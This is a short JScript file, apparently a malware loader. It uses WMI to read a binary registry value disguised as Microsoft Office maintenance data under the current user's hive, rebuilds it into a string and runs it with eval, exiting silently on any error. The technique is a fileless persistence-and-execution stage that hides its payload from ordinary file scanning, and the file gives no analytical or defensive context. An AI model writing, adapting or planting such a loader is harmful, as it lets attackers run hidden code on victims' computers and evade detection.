try {
    var locator = new ActiveXObject("WbemScripting.SWbemLocator");
    var service = locator.ConnectServer(".", "root\\default", "", "");
    service.Security_.ImpersonationLevel = 3;
    var reg = service.Get("StdRegProv");
    var method = reg.Methods_("GetBinaryValue");
    var params = method.inParameters.SpawnInstance_();
    params.hDefKey = 2147483649;
    params.sSubKeyName = "Software\\Microsoft\\Windows\\CurrentVersion\\Maintenance";
    params.sValueName = "MOfficeMaintenance";
    var result = reg.ExecMethod_("GetBinaryValue", params);
    var bytes = result.uValue.toArray();
    var payload = "";
    for (var i = 0; i < bytes.length; i++) {
        payload += String.fromCharCode(bytes[i]);
    }
    eval(payload);
} catch (e) {
    WScript.Quit();
}
